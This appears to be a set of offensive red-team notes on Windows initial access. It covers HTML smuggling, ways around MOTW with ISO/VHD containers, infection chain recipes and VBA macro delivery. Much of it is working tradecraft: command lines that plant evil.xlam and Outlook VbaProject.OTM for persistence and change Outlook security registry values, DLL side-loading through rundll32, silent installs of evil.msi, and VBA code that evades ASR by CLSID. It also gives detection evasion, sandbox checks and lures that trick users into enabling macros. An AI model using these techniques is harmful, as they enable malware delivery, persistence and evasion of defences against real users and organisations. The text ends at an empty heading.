#### Windows Script Host

- VBE, VBS, JSE, JS, XSL, HTA, WSF
- Mostly well detected and subject to AMSI detection. **Effectiveness significantly reduced for Office macros due to default security settings blocking macros from the internet (`MOTW`).**
- Viable strategies for WSH scripts (often requiring MOTW bypass or user interaction):
  - File Dropper
    - download a file from internet/ UNC share or unpack from itself
    - save the file onto workstation
    - run the file directly/indirectly via LOLBIN
  - DotNetToJScript / GadgetToJScript
    - a way to deserialize and run `.NET` executables in-memory
    - use BinaryFormatter to deserialize them
  - XSL TransformNode
    - simple technique to run XSL/XML files in-memory while maintaining low IOC footprint
  - XLAM Dropper
    - Macro-enabled excel add-in file
    - when dropped to `%APPDATA%\Microsoft\Excel\XLSTART`, they are auto-executed when starting excel
  - Microsoft Compiled Help Messages
    - can be used to run a system command whenever user browses into them
    - some used to run VBS or quietly install MSI
  - LNK
    - EXE/ZIP embedded into LNK
    - can be polyglot-ted with `HTA/ISO/PDF/ZIP/RAR/7z`
    - use icons to weaponize, inspect with [LEcmd](https://github.com/EricZimmerman/LECmd) to make sure not disclosing MAC & hostname
    - always run through a LOLBIN like `conhost.exe`
  - HTML Smuggling
    - body `onload` callback
    - optional `setTimeout` delay or direct entrypoint call
    - embedded payload footprint
    - actual logic
      - create a JavaScript `Blob` object holding raw file data
      - if operating on IE use `msSaveOrOpenBlob`
      - else, create a dynamic `<a style="display:none"></a>` HTML node
      - invoke `URL.createObjectURL()` and set `<a href="...">`
      - set download name via `<a>.download`
      - programmatically click the anchor to trigger the download
    - use [detect-headless](https://github.com/infosimples/detect-headless) to identify sandboxes
    - run anti-headless logic after some time elapses
    - Can bypass most secure gateways, but the downloaded file (e.g., ISO, ZIP, LNK, document) still faces endpoint scrutiny. **If the smuggled file relies on macros (e.g., `.docm`), it will likely be blocked by default Office security unless the user explicitly enables content.**
  - COM Hijack
- every VBA strategy requires launcher **and often needs to overcome default macro security blocks**:
  - `WScript.Shell`
  - `WMI Win32_Process::Create`
  - `Shell(...)`
  - etc

### Complex Infection Chains

#### Containerized Malware

- Files downloaded from internet have Mark of the Web(`MOTW`) taint flag
- **Default Behavior:** Office documents having `MOTW` flag have their macros blocked by default, preventing automatic execution. This is a major mitigation against traditional macro-based attacks.
- You can download it from intranet or trusted locations to circumvent this (less common for initial access).
- Some container file formats do not propagate `MOTW` flag to inner files when extracted, providing a potential bypass:
  - ISO / IMG
  - 7zip
  - CAB
  - VHD / VHDX
  - WIM
  - check [MOTW Comparison](https://github.com/nmantani/archiver-MOTW-support-comparison) to make sure

> [!Note]
> (Windows 11 22H2+): ISOs opened via double-click in Explorer inherit MOTW. Using `Mount-DiskImage` via PowerShell typically avoids propagation; validate on your build.

#### Chains Recipe

- In‑the‑wild sample
  - Spear-Phishing
  - Link in mail or Link in PDF
  - HTML Smuggling drops ISO or ZIP
  - ZIP contains `RTLO`‑tricked `.EXE` disguised as `.PDF` being legit 7‑Zip executable
    - `.PDF.EXE` when clicked, sideloads benign `vcruntime140.dll` that imports evil `7za.dll`
  - ISO contains `LNK` + DLL
    - `.LNK` runs `rundll32 evil.dll,SomeExport`
- **Delivery** - convey your chain (HTML smuggling drop in drive-by download fashion)
- **Container** - archive bundling all infection files
  - `ISO/IMG/ZIP` can contain hidden files
- **Trigger** - some way to run our payload (`LNK/CHM`)
- **Payload** - our malware
  - **Note:** Macro-enabled office documents (`.docm`, `.xlsm`) are less reliable for initial execution due to `MOTW` blocks unless combined with social engineering or specific bypasses.
  - can be macro-enabled office document with `MOTW` stripped (e.g., delivered inside a container like ISO/VHD)
  - `DLL/CPL/XLL` to be loaded by trigger directly or indirectly with LOLBIN (XLLs also subject to `MOTW` blocking if downloaded directly)
  - `XLAM` to be copied to `XLSTART` for persistence & abusing office trusted path
  - `MSI/MSP` to run during silent installation (`MOTW` stripped)
  - `VbaProject.OTM` for outlook persistence
  - `.EXE + .DLL` executing through side-loading attack
- **Decoy** - keep your victim happy by displaying some interesting stuff

#### Successful Strategies

```bash
# plant evil.xlam to %APPDATA%\Microsoft\Excel\XLSTART so that next time user opens up Excel it will get loaded
cmd /c echo f | xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\Microsoft\Excel\XLSTART | decoy.pdf

# Plant VbaProject.otm to %APPDATA%\Microsoft\Outlook\VbaProject.OTM and alter registry so upon outlook restart VBA will be loaded and act on every new email arrived
cmd /c reg add hkcu\software\micorosft\office\16.0\outlook\security /f /v Level /t reg_dword /d 1 | echo f | xcopy /Q/R/S/Y/H/G/I evil.xlam %APPDATA%\Microsoft\Outlook\VbaProject.OTM | decoy.pdf
# corrected HKCU path
cmd /c reg add hkcu\software\microsoft\office\16.0\outlook\security /f /v Level /t reg_dword /d 1 | echo f | xcopy /Q/R/S/Y/H/G/I evil.xlam %APPDATA%\Microsoft\Outlook\VbaProject.OTM | decoy.pdf

# your ZIP/ISO/IMG will contain signed executable prone to DLL Hijacking/side-loading and appropriate malicious DLL
cmd /c DISM.exe | decoy.pdf

# load .DLL through LOLBIN
cmd /c rundll32 evil.dll,Infect | decoy.pdf

# LNK/CHM that runs PowerShell to locate own .ZIP, then unpacks ZIP contents elsewhere then changes dir into there, then registers .XLL (having stripped MOTW)

# ClickOnce deployment requires several local files; bundle into ZIP/ISO, hide them, then deploy ClickOnce followed by opening decoy.pdf

# PowerShell might use Unblock-File on .MSI and then silently install it
powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi ; .\decoy.pdf

# install signed MSI and apply an unsigned MST
powershell msiexec /q /i .\Zoom-signed-installer.msi TRANSFORMS=evil.mst ; .\decoy.pdf

# run WSH script
cmd /c wscript evil.wsf | decoy.pdf

# LNK/CHM that runs PowerShell to locate its own ZIP, then unpacks ZIP contents elsewhere, changes directory and runs tasks (e.g., deploy ClickOnce)
```

## VBA Infection Strategies

- **Important Note:** The effectiveness of traditional VBA macro execution on document open (`AutoOpen`, `Document_Open`) is significantly diminished due to Microsoft's default security policy blocking macros in files downloaded from the internet (`MOTW`). Successful execution often requires social engineering to have the user explicitly trust the document/location or alternative execution methods (like COM hijacking triggered later, Add-Ins, etc.).
- `Alt+F11IM` - quickly inserts VBA module into a document
- abuse path
  - execute
  - file dropper
  - COM hijack
  - DotNetToJScript
- use of WinAPI is strongly inadvisable due to detection
- `GetUserNameA` might be fine but things like `CreateProcessA` is a big no-no
- `AutoOpen,Document_Open, etc` can be used to auto-run our script

### Attack Surface Reduction Rules

- Set of policies enforced by Microsoft Defender Exploit Guard attempting to contain malicious activities
- [Defender ASR Rules](https://adamsvoboda.net/extracting-asr-rules/)
- [ExtractedDefender](https://github.com/HackingLZ/ExtractedDefender)
- [commial ASR](https://github.com/commial/experiments/tree/master/windows-defender/ASR)

### Execute

- Most basic strategy is to simply run some command with LOLBIN. **Subject to macro execution policies.**
- Avoid running immediately; prefer persistence. Consider COM/DLL hijacking and always use LOLBINs.
- useful ones
  - `Wscript.Shell.Exec` - prefix with `obf_` to facilitate later obfuscation
  - `InvokeVerbEx` - evades detection but sometimes doesn't work with LOLBIN
  - `RDS.DataSpace` - supposed to be obsolete, but still works
- use [AMSITools](https://gist.github.com/mgeeky/013b16a3e4a88b6022d3d7dbfe3d6f6f) to review AMSI events

```bash
# evade ASR
CreateObject("WScript.Shell") == CreateObject("new=72C24DD5-D70A-4388-8A42-98424B88AFB8")

# full sample to evade ASR
Sub obf_LaunchCommand(ByVal obf_command As String)
  On Error GoTo obf_ProcError
  Dim obf_launcher As String
  Dim obf_cmd
  With CreateObject("new:72C24DD5-D70A-4388-8A42-98424B88AFB8")
       With .Exec(obf_command)
            .Terminate
       End With
  End With
obf_ProcError:
End Sub

# RDS.DataSpace
Sub obf_LaunchCommand(ByVal obf_command As String)
  On Error GoTo obf_ProcError
  Dim obf_objOL, obf_shellObj
  Set obf_objOL = CreateObject("new:BD96C5566-65A3-11D0-983A-00C04FC29E36")
  Set obf_shellObj = obf_objOL.CreateObject("Shell.Application", "")
  obf_shellObj.ShellExecute obf_command

obf_ProcError
End Sub
```

### DotNetToJScript

- `DotNetToJScript` - runs `.NET` assemblies in-memory through `Assembly.Load`. **Still requires the initial VBA/JScript execution, which is often blocked.**

### File Dropper

- Deadly as long as AV/EDR not detect our dropped payload `OnWrite`. **The initial macro execution to drop the file is the primary hurdle due to default security.**
- files can be pulled from
  - internet
  - office file structures
  - inside VBA code itself - not good

### COM Hijack

- Plants dodgy COM server via registry key in `HKCU` that overrides `HKLM` system defaults. **This is a persistence/later execution technique, bypassing the initial macro block issue, but the initial planting still needs to occur.**
- create registry key structure using VBA
- drop a DLL file to HDD
- wait until system/application picks that COM object up and instantiate it
- beware your DLL might be executed hundreds time per minute
- implement single-instance / single-run logic
- don't hijack `MMDeviceEnumerator`, user sees issues
- use `CacheTask` -> `{0358B920-0AC7-98F4-58E32CD89148}`
- learn more [here](https://gist.github.com/mgeeky/7d2f8363f5e8961daa51b56869101a8a)

### Lures

- Present plausible pretext that gets removed after macros run ( like `docusign` or adjust to your version). **Modern lures often need to convince the user to click "Enable Content" or move the file to a trusted location.**
- we can leverage shapes (images, text boxes, macro cycles through them)
- big blob of shellcode embedded in VBA stands out
- we can use
  - shellcode or commands in document properties
  - word variables
  - word/excel/powerpoint parts
  - VBA forms
  - spreadsheet cells
  - Word `ActiveDocument.Paragraphs`

### Alternative AutoRuns

- Proxy sandboxes like `Zscaler` are sensitive to `Auto_Open()`, that might give away our maldoc. **These autoruns are also subject to the default macro blocking policies.**
- `Workboot_SheetCalculate += RAND()` might be useful
- MS Word Remote Templates are a good choice as well
- Office offers customizing ribbon based on `CustomUI XML`; we can abuse the `onLoad` part as well
- ActiveX controls can be inserted into document, but will be called a lot so keep it simple. **Also subject to security controls.**

### Exotic VBA Carriers

- MS Office
  - Access `.accde, .mdb`, PowerPoint, Publisher `.pub`
  - Visio `.vsdm`, Visio97 `.vsd` , MS Project `.mpp`
  - Publisher RTF files
  - Outlook `ThisOutLookSession`, `VBAProject.OTM`
- SCADA Systems
  - Siemens SIMATIC HMI WinCC
  - General Electric HMI Scada iFix
  - IGSS schneider-electric
- CAD Software
  - VBA Module for AutoCAD / VBA Manager in AutoCAD 2021
  - ProgeCAD Professional
  - SOLIDWORKS `.swp,.swb` VBA Project files
  - DS CATIA V5
  - Bentley MicroStation CONNECT `.MVBA` files
- Others
  - ArcMap `.MXT` files
  - Oscilloscopes Keysight E5071C Network Analyzer
  - TIBCO Statistica Visual Basic `.SVB` analysis configuration
  - Rocket Terminal Emulator
  - MicroFocus InfoConnect Desktop

### VBA Stream Manipulation

- VBA macros are stored in `vbaProject.bin` OLE stream modules
- each module consists of
  - `PerformanceCache` - compiled VBA code, office version specific
  - `CompressedSourceCode` - compressed VBA with MS proprietary algorithm
- VBA Stomping relies on the fact that Office prefers executing `PerformanceCache` if its version matches, so we can use malicious performance cache and innocuous compressed code. **Detection for stomping has improved, and the macro execution itself is still subject to security policies.**
- `EvilClippy` offers other useful features as well
  - Hide VBA from GUI
  - Remove metadata stream
  - Set random module names
  - Make VBA Project unviewable/locked
  - `EvilClippy.exe -s fakecode.vba -t 2016x8666 macrofile.doc`
- VBA Purging
  - removes `PerformanceCache` from module and `_VBA_PROJECT` streams
  - changes `MODULEOFFSET` to 0
  - removes all `__SRP_#` streams
  - this removes strings representing VBA code parts, lowering detection potential

### Evasion Tactics

- Uglify - remove empty lines, add random indentation, insert garbage code & comments
- Rename variables and function/sub names
- Randomize functions order
- Obfuscate strings
- Avoid overly long lines
- Payload obfuscation is trickier
- use [VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator)
- Sandbox Evasion
  - detect if running in sandbox environment, don't run any further. **Doesn't bypass the default user-facing macro block.**
  - validation of username/domain
  - uptime check
- internet-exposed IPv4 geolocation & reverse‑PTR
  - weaker stuff (hardware,process list, NIC MAC addresses)
- Office Files Encryption
  - Powerful evasion technique against _static analysis_ but does not bypass the runtime macro execution blocks based on `MOTW`.
  - Office documents can be password-protected / encrypted
  - Excel always tries hardcoded password value of `VelvetSweatshop`
  - Powerpoint always tries `/01Hannes Ruescher/01`
  - use `msoffice-crypt.exe`
- Office trusted path + AMSI evasion
  - **Relies on getting the file into a trusted path first, bypassing the initial MOTW block.**
  - requires disabling/patching optics
  - sometimes works
- checkout [zip motw](https://breakdev.org/zip-motw-bug-analysis/) for a sample MOTW evasion

## MSI Shenanigans

